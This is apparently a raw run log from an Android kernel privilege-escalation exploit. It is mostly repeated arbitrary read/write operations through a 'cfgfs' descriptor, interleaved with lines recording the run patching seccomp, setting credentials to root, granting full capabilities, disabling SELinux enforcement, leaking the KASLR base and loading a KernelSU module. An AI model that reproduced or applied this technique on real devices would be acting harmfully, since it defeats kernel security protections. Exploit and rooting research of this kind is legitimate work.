+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot seccomp patched ok=1 flags=0000000004000000/0000000004000000 atomic=0000000000000000/0000000000000000 mode=0/0 count=0/0 filter=0000000000000000/0000000000000000
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child proceeding uid=0 euid=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mpipe-physrw-summary pid=13382 done=1 root=1 kaslr=1
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child insmod helper forked pid=26547 fm=/data/local/tmp/ksu_boot/finitmod ko=/data/local/tmp/ksu_boot/kernelsu.ko
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child coldstart forked pid=26548 script=/data/local/tmp/ksu_boot/restore.sh
+[b59eeb053 06:43:06] [33m[*][t26257] [0mpipe-physrw-summary pid=26257 done=1 root=1 kaslr=1
+[b59eeb053 06:43:06] [31m[-][t18909] [0mpstore dump: 3 files -> /data/local/tmp/pstore_dump
+[b59eeb053 06:43:06] [31m[-][t26257] [0mpstore dump: 3 files -> /data/local/tmp/pstore_dump
+[b59eeb053 06:43:06] [33m[*][t18909] [0mkaslr file persisted path=/data/local/tmp/ksu_kaslr text=ffffffdfba280000
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t26257] [0mkaslr file persisted path=/data/local/tmp/ksu_kaslr text=ffffffdfba280000
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot cred patched uid=2413814911/2413814911 sid=1492739/1492739
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot caps patched cred eff=0000000000000000/000001ffffffffff prm=0000000000000000/000001ffffffffff amb=0000000000000000/000001ffffffffff bset=00000000000000c0/000001ffffffffff real_eff=0000000000000000/000001ffffffffff
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot selinux direct write ok=1 1->0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot child result done=1 uid_after=0 setgid=0/0 setuid=0/0 setenforce=0/0 selinux=1->0 installer=0 pid=0 err=0 started=0 done=0 ok=0 uid=0 euid=0 cap=ffffffdfbc77b388/ffffffdfbc77b388
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpi_cleanup fast tid=18909 task=ffffff9392cfa180 blocked_on ffffffc02fd13c88->0000000000000000 write=1
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpi_cleanup: fast path clean on self task; skipping lossy walk
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff9162e95d08 len=8 fill=0 pos=7883678008957363548 page=92978c303372f7ac hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff9162e95d10 len=8 fill=0 pos=7883678008957363548 page=92978c303372f7b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpselect scrubbed dirty slot=0 lock=ffffff9162e95d00
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef538010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd1ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef538810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd22b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd2ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539010 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd32b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53a010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd3ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53a010 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53a810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd42b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53a810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53b010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd4ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53b810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd52b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53b810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53c010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd5ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53c010 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53c810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd62b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53c810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53d010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd6ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53d010 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53d810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd72b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53d810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53e010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd7ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53e810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd82b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53e810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53f010 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd8ab4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53f010 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef53f810 len=8 fill=0 pos=7883678008957363548 page=92978c32bfdd92b4 hi=65 set=0 rd=8 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef53f810 len=8 set=0 wr=8 errno=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpipe cleared forged ops count=12 base=ffffff93ef538000
+[b59eeb053 06:43:07] [33m[*][t18909] [0mroot self pi_cleanup ok=1 waiter_tid=18909 done=1 (pre-self)
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:07] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
